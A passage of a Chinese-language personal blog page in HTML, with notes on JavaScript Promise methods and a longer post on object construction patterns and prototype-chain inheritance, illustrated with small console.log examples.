-<h2 id="Promise-reject"><a href="#Promise-reject" class="headerlink" title="Promise.reject"></a>Promise.reject</h2><p>返回一个新的 Promise 实例，该实例的状态为rejected。<br>var p = Promise.reject(‘出错了’);<br>Promise.reject()方法的参数，会原封不动地作为reject的理由，变成后续方法的参数</p>
-<h2 id="done-finally"><a href="#done-finally" class="headerlink" title="done finally"></a>done finally</h2><p>done方法，总是处于回调链的尾端，保证抛出任何可能出现的错误，没有参数<br>finally方法用于指定不管Promise对象最后状态如何，都会执行的操作<br>可以接受一个普通的回调函数作为参数，该函数不管怎样都必须执行。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/js/obj.html">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="YooHannah">
-    <meta itemprop="description" content>
-    <meta itemprop="image" content="/psb.jpg">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="My Little World">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="My Little World" src>
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/post/js/obj.html" itemprop="url">
-                  对象构造和继承
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-19T09:56:37+08:00">
-                2017-08-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="对象特性"><a href="#对象特性" class="headerlink" title="对象特性"></a>对象特性</h1><p>对象的属性在定义时，都带有一些特征值，js通过这些特征值定义他们的行为<br>这些特征值描述对象属性的各种特征,成为对象属性的特性<br>特性是内部值,放在两对方括号中访问<br>特性分为数据属性和访问器属性<br>数据属性：Configurable、Enumerable、Writable、Value<br>访问器属性：Configurable、Enumerable、Get、Set<br>定义某个属性的特性：Object.defineProperty(对象名,对象属性名,{特性1：值,特性2：值…})<br>定义多个属性特性:Object.defineProperties(对象名,{属性1：{特性1：值,特性2：值…},属性2：{特性1:值….}})<br>读取属性:Object.getOwnPropertyDescriptor(对象名,属性名) 返回一个对象</p>
-<h1 id="构造对象"><a href="#构造对象" class="headerlink" title="构造对象"></a>构造对象</h1><h2 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function createobj(name,age)&#123;</span><br><span class="line">  var o=new Object();</span><br><span class="line">  o.name = name;</span><br><span class="line">  o.age = age;</span><br><span class="line">  o.sayName = function()&#123;</span><br><span class="line">    console.log(this.name)</span><br><span class="line">  &#125;;</span><br><span class="line">  return o;</span><br><span class="line">&#125;</span><br><span class="line">var person1 = createobj(&apos;gray&apos;,25);</span><br><span class="line">var person2 = createobj(&apos;black&apos;,26);</span><br><span class="line">person1.sayName()//gray</span><br><span class="line">person2.sayName()//black</span><br><span class="line">console.log(typeof person1)//object</span><br><span class="line">console.log(person1 instanceof createobj) //false</span><br></pre></td></tr></table></figure>
-<p>缺点：无法识别对象类型</p>
-<h2 id="寄生构造函数"><a href="#寄生构造函数" class="headerlink" title="寄生构造函数"></a>寄生构造函数</h2><p>定义样子同工厂模式,只不过创建实例时用new 操作符<br>将包装函数叫做 构造函数<br>实例与构造函数及其原型没有关系<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function createobj(name,age)&#123;  //构造函数</span><br><span class="line">  var o=new Object();</span><br><span class="line">  o.name = name;</span><br><span class="line">  o.age = age;</span><br><span class="line">  o.sayName = function()&#123;</span><br><span class="line">    console.log(this.name)</span><br><span class="line">  &#125;;</span><br><span class="line">  return o;</span><br><span class="line">&#125;</span><br><span class="line">var person1 = new createobj(&apos;gray&apos;,25);</span><br><span class="line">person1.sayName()//gray</span><br><span class="line">console.log(person1 instanceof createobj) //false</span><br><span class="line">console.log(person1 instanceof Object) //true</span><br></pre></td></tr></table></figure></p>
-<p>应用:为无法修改构造函数的对象添加方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//给数组增加特殊方法</span><br><span class="line">function specialArray()&#123;</span><br><span class="line">  var values = new Array();</span><br><span class="line">  values.push.apply(values,arguments);</span><br><span class="line">  values.toPiedString = function(str)&#123; //特殊方法</span><br><span class="line">    return this.join(str);</span><br><span class="line">  &#125;;</span><br><span class="line">  return values;</span><br><span class="line">&#125;</span><br><span class="line">var colors = new specialArray(&apos;red&apos;,&apos;blue&apos;);</span><br><span class="line">console.log(colors.toPiedString(&apos;|&apos;));//&quot;red|blue&quot;</span><br></pre></td></tr></table></figure></p>
-<h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function createobj(name,age)&#123;</span><br><span class="line">  this.name = name;</span><br><span class="line">  this.age = age;</span><br><span class="line">  this.sayName = function()&#123;</span><br><span class="line">    console.log(this.name)</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">var person1 = new createobj(&apos;gray&apos;,25);</span><br><span class="line">person1.sayName(); //gray</span><br><span class="line"></span><br><span class="line">console.log(person1 instanceof createobj)//true</span><br><span class="line">console.log(person1 instanceof Object)//true</span><br><span class="line"></span><br><span class="line">console.log(window.name)//&apos;&apos;</span><br><span class="line">var person2 = createobj(&apos;black&apos;,26);</span><br><span class="line">console.log(person2) //undefined</span><br><span class="line">console.log(window.name) //black</span><br><span class="line">console.log(person1.sayName == window.sayName)//false</span><br><span class="line"></span><br><span class="line">var person3 = new createobj(&apos;orange&apos;,25);</span><br><span class="line">console.log(person1.sayName == person3.sayName)//false</span><br><span class="line"></span><br><span class="line">console.log(person1.constructor == createobj)//true</span><br><span class="line">console.log(person3.constructor == person1.constructor)//true</span><br></pre></td></tr></table></figure>
-<p>1、构造函数的实例均指向构造函数。例：person1、person3的constructor均指向createobj)<br>2、不使用new 关键字调用构造函数,构造函数的方法和属性会挂到window上面。例：person2<br>3、定义在构造函数上的方法,创建不同实例后,不同实例各自拥有自己的该方法,不同实例之间构造函数方法不相等,不共享</p>
-<p>使用构造函数创建对象,如果相让对象方法在不同实例实现共享,则在定义方法时，采用引用函数的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function createobj(name,age)&#123;</span><br><span class="line">  this.name = name;</span><br><span class="line">  this.age = age;</span><br><span class="line">  this.sayName = sayName;</span><br><span class="line">&#125;</span><br><span class="line">function sayName()&#123;</span><br><span class="line">   console.log(this.name)</span><br><span class="line">&#125;</span><br><span class="line">var person1 = new createobj(&apos;gray&apos;,25);</span><br><span class="line">var person3 = new createobj(&apos;orange&apos;,25);</span><br><span class="line">console.log(person1.sayName == person3.sayName)//true</span><br></pre></td></tr></table></figure></p>
-<p>缺点:若对象需要定义多个方法则需要创建多个全局函数供构造函数引用,失去封装性</p>
-<h2 id="原型模式"><a href="#原型模式" class="headerlink" title="原型模式"></a>原型模式</h2><p>在对象的prototype中定义的属性和方法,可以在所有实例中共享<br>定义方法一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">function createobj(name,age)&#123;&#125;</span><br><span class="line">createobj.prototype.name = &apos;black&apos;;</span><br><span class="line">createobj.prototype.age = 26;</span><br><span class="line">createobj.prototype.sayName = function()&#123;</span><br><span class="line">   console.log(this.name)</span><br><span class="line">&#125;</span><br><span class="line">var person1 = new createobj();</span><br><span class="line">var person2 = new createobj();</span><br><span class="line">person1.sayName();//black</span><br><span class="line">person2.sayName();//black</span><br><span class="line">console.log(person1.sayName == person2.sayName)//true</span><br><span class="line"></span><br><span class="line">console.log(person1.constructor == createobj)//true</span><br><span class="line">console.log(person2.constructor == person1.constructor)//true</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">console.log(person1.age)   //26 来自原型</span><br><span class="line">person1.age = 27;          //相当于创建了一个实例属性</span><br><span class="line">console.log(person1.age)   //27 来自实例属性</span><br><span class="line">console.log(person2.age)   //26 来自原型</span><br><span class="line">delete person1.age;        //删除实例属性</span><br><span class="line">console.log(person1.age)   //26 来自原型</span><br><span class="line">delete person1.age;        //不能删除原型属性</span><br><span class="line">console.log(person1.age)   //26</span><br><span class="line">console.log(person2.age)   //26</span><br><span class="line"></span><br><span class="line">console.log(person1 == createobj.prototype)//false</span><br><span class="line">console.log(person1.prototype == createobj.prototype)//false</span><br><span class="line">console.log(createobj.prototype.isPrototypeOf(person1))//true</span><br><span class="line">console.log(person1.prototype) //undefined</span><br><span class="line">console.log(Object.getPrototypeOf(person1));//createobj.prototype</span><br><span class="line"></span><br><span class="line">console.log(person1.hasOwnProperty(&apos;name&apos;));//false</span><br><span class="line">console.log(&apos;name&apos; in person1);//true</span><br><span class="line">console.log(Object.keys(createobj.prototype));//[&quot;name&quot;, &quot;age&quot;, &quot;sayName&quot;]</span><br><span class="line">console.log(Object.getOwnPropertyNames(createobj.prototype));//[&quot;constructor&quot;, &quot;name&quot;, &quot;age&quot;, &quot;sayName&quot;]</span><br></pre></td></tr></table></figure></p>
-<p><img src="/image/obj1.png" alt="obj1"><br>1、实例的内部指针[[Prototype]] 会指向构造函数的原型对象,它是不能直接访问的<br>2、构造函数的prototype也会指向构造函数的原型对象,但他是构造函数的一个属性，可以直接访问<br>3、Object.getPrototypeOf(实例名); 返回实例的原型对象 .即[[Prototype]]指向的对象<br>4、实例名.hasOwnProperty(属性名字符串) ; 只检查实例的实例属性中是否有该属性,没有的话,返回false,可用于检查该属性在实例属性中，还是在原型属性中<br>5、在获取属性值时，实例属性中有该属性就取该实例属性的值,没有则用原型属性值,原型属性也没有的话则返回undefined<br>6、实例属性可用delete删除,实例无法更改原型属性的值<br>7、属性名字符串 in 实例名; 检查实例和原型所有属性中是否有该属性,有的话就返回true;for-in循环可枚举的属性,包括实例属性和原型属性<br>8、Object.keys(对象名);返回对象可枚举属性的字符串数组<br>9、Object.getOwnPropertyNames(对象名);返回所有对象的实例属性,无论它是否枚举</p>
-<p>定义方法二<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function createobj()&#123;&#125;</span><br><span class="line">createobj.prototype=&#123;</span><br><span class="line">  name:&apos;seven&apos;,</span><br><span class="line">  sayName:function()&#123;</span><br><span class="line">    console.log(this.name)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">var person1 = new createobj();</span><br><span class="line">person1.sayName();//seven</span><br><span class="line">console.log(person1.constructor == createobj);//false</span><br><span class="line">console.log(person1.constructor == createobj.prototype);//false</span><br><span class="line">console.log(person1.constructor == Object);//true</span><br><span class="line">console.log(person1.constructor == createobj.prototype.constructor);//true</span><br><span class="line">console.log(person1.constructor);//function object()&#123;&#125;</span><br><span class="line"></span><br><span class="line">console.log(person1 instanceof Object);//true</span><br><span class="line">console.log(person1 instanceof createobj);//true</span><br></pre></td></tr></table></figure></p>
-<p>1、将挂在构造函数原型上的属性以一个对象的形式，一起赋给构造函数原型,即构造函数原型被赋值为一个对象<br>2、构造函数原型被Object创建,实例、构造函数的原型对象的构造函数为Object对象<br>3、若在定义原型对象时,指定原型对象的constructor,则对象实例的constructor也会跟着指到相应的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function createobj()&#123;&#125;</span><br><span class="line">createobj.prototype=&#123;</span><br><span class="line">  constructor:createobj, //明确指出,同时特性的枚举属性会被设置为true,默认为false</span><br><span class="line">  name:&apos;seven&apos;,</span><br><span class="line">  sayName:function()&#123;</span><br><span class="line">    console.log(this.name)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">var person1 = new createobj();</span><br><span class="line">person1.sayName();//seven</span><br><span class="line">console.log(person1.constructor == createobj);//true</span><br><span class="line">console.log(person1.constructor == createobj.prototype);//false</span><br><span class="line">console.log(person1.constructor == Object);//false</span><br><span class="line">console.log(person1.constructor == createobj.prototype.constructor);//true</span><br><span class="line">console.log(person1.constructor);//function createobj()&#123;&#125;</span><br><span class="line"></span><br><span class="line">console.log(person1 instanceof Object);//true</span><br><span class="line">console.log(person1 instanceof createobj);//true</span><br></pre></td></tr></table></figure></p>
-<p>4、 实例中的指针指向原型，不指向构造函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function createobj()&#123;&#125;</span><br><span class="line"></span><br><span class="line">var person1 = new createobj();</span><br><span class="line">console.log(person1 instanceof createobj);//true</span><br><span class="line">createobj.prototype=&#123;</span><br><span class="line">  constructor:createobj,</span><br><span class="line">  name:&apos;seven&apos;,</span><br><span class="line">  sayName:function()&#123;</span><br><span class="line">    console.log(this.name)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">//person1.sayName();//person1.sayName is not a function</span><br><span class="line">console.log(person1.constructor == createobj);//true</span><br><span class="line">console.log(person1.constructor == createobj.prototype);//false</span><br><span class="line">console.log(person1.constructor == Object);//false</span><br><span class="line">console.log(person1.constructor == createobj.prototype.constructor);//true</span><br><span class="line">console.log(person1.constructor);//function createobj()&#123;&#125;</span><br><span class="line"></span><br><span class="line">console.log(person1 instanceof Object);//true</span><br><span class="line">console.log(person1 instanceof createobj);//false</span><br></pre></td></tr></table></figure></p>
-<p><img src="/image/obj2.png" alt="obj2"><br>对象生成实例后,再去重写构造函数的原型对象,会将构造函数的原型对象指向后来被赋的对象,<br>切断与旧的原型对象之间的关系，新的原型对象与实例没有任何关系,实例仍引用旧的原型对象</p>
-<p>原型方法可用于修改添加原生对象的属性方法<br>缺点:在原型对象prototype中的属性方法全都共享,当更改一个实例中的属性值时,其他实例一起变<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">//定义一</span><br><span class="line">function createobj(name,age)&#123;&#125;</span><br><span class="line">createobj.prototype.name = [1,2];</span><br><span class="line">createobj.prototype.sayName = function()&#123;</span><br><span class="line">   console.log(this.name)</span><br><span class="line">&#125;</span><br><span class="line">var person1 = new createobj();</span><br><span class="line">var person2 = new createobj();</span><br><span class="line">person1.sayName();//[1, 2]</span><br><span class="line">person2.sayName();//[1, 2]</span><br><span class="line">person1.name.push(3);</span><br><span class="line">person1.sayName();//[1, 2, 3]</span><br><span class="line">person2.sayName();//[1, 2, 3]</span><br><span class="line">//定义二</span><br><span class="line">function createobj()&#123;&#125;</span><br><span class="line">createobj.prototype=&#123;</span><br><span class="line">  constructor:createobj,</span><br><span class="line">  name:[1,2],</span><br><span class="line">  sayName:function()&#123;</span><br><span class="line">    console.log(this.name)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">var person1 = new createobj();</span><br><span class="line">var person2 = new createobj();</span><br><span class="line">console.log(person1.name)//[1, 2]</span><br><span class="line">console.log(person2.name)//[1, 2]</span><br><span class="line">person1.name.push(3);</span><br><span class="line">console.log(person1.name)//[1, 2, 3]</span><br><span class="line">console.log(person2.name)//[1, 2, 3]</span><br></pre></td></tr></table></figure></p>
-<h2 id="构造函数-原型模式"><a href="#构造函数-原型模式" class="headerlink" title="构造函数+原型模式"></a>构造函数+原型模式</h2><p>构造函数定义实例属性，<br>原型模式定义方法和共享属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function createobj(name,age)&#123;</span><br><span class="line">  this.name = name;</span><br><span class="line">  this.age = age;</span><br><span class="line">  this.friends = [1,2];</span><br><span class="line">&#125;</span><br><span class="line">createobj.prototype=&#123;</span><br><span class="line">  constructor:createobj,</span><br><span class="line">  sayName:function()&#123;</span><br><span class="line">    console.log(this.name)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">var person1 = new createobj(&apos;halo&apos;,24);</span><br><span class="line">var person2 = new createobj(&apos;jack&apos;,25);</span><br><span class="line">person1.friends.push(3);</span><br><span class="line">console.log(person1.friends);//[1, 2, 3]</span><br><span class="line">console.log(person2.friends);//[1, 2]</span><br></pre></td></tr></table></figure></p>
-<p>是用来定义引用类型的一种默认模式</p>
-<h2 id="动态原型模式"><a href="#动态原型模式" class="headerlink" title="动态原型模式"></a>动态原型模式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">function createobj(name,age)&#123;</span><br><span class="line">  this.name = name;</span><br><span class="line">  this.age = age;</span><br><span class="line">  if(typeof this.sayName !=&apos;function&apos;)&#123;</span><br><span class="line">    createobj.prototype.sayName = function()&#123;</span><br><span class="line">     console.log(this.name)</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">var person1 = new createobj(&apos;halo&apos;,24);</span><br><span class="line">var person2 = new createobj(&apos;jack&apos;,26);</span><br><span class="line">person1.sayName();//halo</span><br><span class="line">person2.sayName();//jack</span><br><span class="line"></span><br><span class="line">//修改原型</span><br><span class="line">createobj.prototype.sayName = function()&#123;</span><br><span class="line">     console.log(&apos;111&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">person1.sayName();//111</span><br><span class="line">person2.sayName();//111</span><br><span class="line"></span><br><span class="line">//使用字面方式重写</span><br><span class="line">createobj.prototype=&#123;</span><br><span class="line">  constructor:createobj,</span><br><span class="line">  sayName:function()&#123;</span><br><span class="line">    console.log(222)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">var person3 = new createobj(&apos;kitty&apos;,24);</span><br><span class="line">person1.sayName();//111</span><br><span class="line">person2.sayName();//111</span><br><span class="line">person3.sayName();//222</span><br><span class="line">console.log(person1.prototype);//undefined</span><br><span class="line"></span><br><span class="line">//重写一个原型方法</span><br><span class="line">person1.sayName=function()&#123;</span><br><span class="line">  console.log(&apos;333&apos;);</span><br><span class="line">&#125;</span><br><span class="line">person1.sayName();//333</span><br><span class="line">person2.sayName();//111</span><br></pre></td></tr></table></figure>
-<p>1、判断sayName函数是否存在的语句，只会在初次调用构造函数的时候运行，即第一次创建实例的时候运行，<br>  运行过后，构造函数原型中就会存在sayName函数，即完成初始化，之后就不会在运行<br>2、对原型模式定义的方法属性能够在所有实例中立即得到放映<br>3、如果对构造函数原型使用字面方式重写，将切断已有实例与构造函数原型的联系，<br>   已有实例会指向就原型对象，新建实例会指向新原型对象<br>4、在一个实例中重写一个原型方法，不会影响原型对象方法，其他实例和新建实例仍会调用原型对象方法</p>
-<h2 id="稳妥构造函数"><a href="#稳妥构造函数" class="headerlink" title="稳妥构造函数"></a>稳妥构造函数</h2><p>创建对象的实例方法，不使用this<br>不使用new调用构造函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function createobj(name,age)&#123;  //构造函数</span><br><span class="line">  var o=new Object();</span><br><span class="line">  o.name = name;</span><br><span class="line">  o.age = age;</span><br><span class="line">  o.sayName = function()&#123;</span><br><span class="line">    console.log(this.name)；</span><br><span class="line">    console.log(this == o) </span><br><span class="line">  &#125;;</span><br><span class="line">  return o;</span><br><span class="line">&#125;</span><br><span class="line">var person1 = createobj(&apos;gray&apos;,25);</span><br><span class="line">person1.sayName()//gray true</span><br><span class="line"></span><br><span class="line">console.log(person1 instanceof createobj) //false</span><br></pre></td></tr></table></figure></p>
-<p>只用通过sayName函数访问传入到构造函数中的原始成员</p>
-<h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><h2 id="实例原型链模式"><a href="#实例原型链模式" class="headerlink" title="实例原型链模式"></a>实例原型链模式</h2><p>继承函数的原型被赋值为祖先函数的实例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">//祖先函数</span><br><span class="line">function Superfn()&#123;</span><br><span class="line">  this.pro = true;</span><br><span class="line">  this.color = [1,2];</span><br><span class="line">  this.getsuper = function()&#123;</span><br><span class="line">    console.log(&apos;aaa&apos;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Superfn.prototype.getsuper=function()&#123;</span><br><span class="line">  console.log(&apos;bbb&apos;);</span><br><span class="line">&#125;</span><br><span class="line">//继承函数</span><br><span class="line">function Subfn()&#123;</span><br><span class="line">  this.subpro = false;</span><br><span class="line">  this.getsuper = function()&#123;</span><br><span class="line">    console.log(&apos;000&apos;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Subfn.prototype = new Superfn();</span><br><span class="line">Subfn.prototype.getsuper = function()&#123;</span><br><span class="line">    console.log(&apos;ccc&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">var ins = new Subfn();</span><br><span class="line">ins.getsuper();</span><br><span class="line"></span><br><span class="line">console.log(ins instanceof Object); //true</span><br><span class="line">console.log(ins instanceof Superfn); //true</span><br><span class="line">console.log(ins instanceof Subfn); //true</span><br><span class="line">console.log(Object.prototype.isPrototypeOf(ins)); //true</span><br><span class="line">console.log(Superfn.prototype.isPrototypeOf(ins)); //true</span><br><span class="line">console.log(Subfn.prototype.isPrototypeOf(ins)); //true</span><br><span class="line"></span><br><span class="line">var ins1 = new Subfn();</span><br><span class="line">console.log(ins.color)//[1,2]</span><br><span class="line">console.log(ins1.color)//[1,2]</span><br><span class="line">ins1.color.push(4);</span><br><span class="line">console.log(ins.color)//[1,2,4]</span><br><span class="line">console.log(ins1.color)//[1,2,4]</span><br></pre></td></tr></table></figure></p>
-<p>1.继承函数实例的属性/方法调用顺序：<br>自己定义的-&gt;继承函数实例-&gt;继承函数prototype-&gt;祖先函数实例属性-&gt;祖先函数prototype<br>2.因为所有引用类型默认继承object,所以调用toString等方法时，其实调用的的是object的prototype<br>3.重写原型中祖先函数的方法,一定要在继承函数原型被赋值祖先函数实例之后，相当于用实例方法覆盖原型方法<br>但注意不能用字面量方法重写继承函数原型,这样会导致继承函数原型重新指向新对象，切断与祖先函数联系<br>4.因为继承函数prototype指向祖先函数实例时,祖先函数所有属性相当于继承函数prototype属性，<br>构造函数原型的属性会被所有实例共享，所以创建继承函数实例时,<br>不能像祖先函数的构造函数中传递参数,因为会导致其他实例同时共享这些参数导致的后果</p>
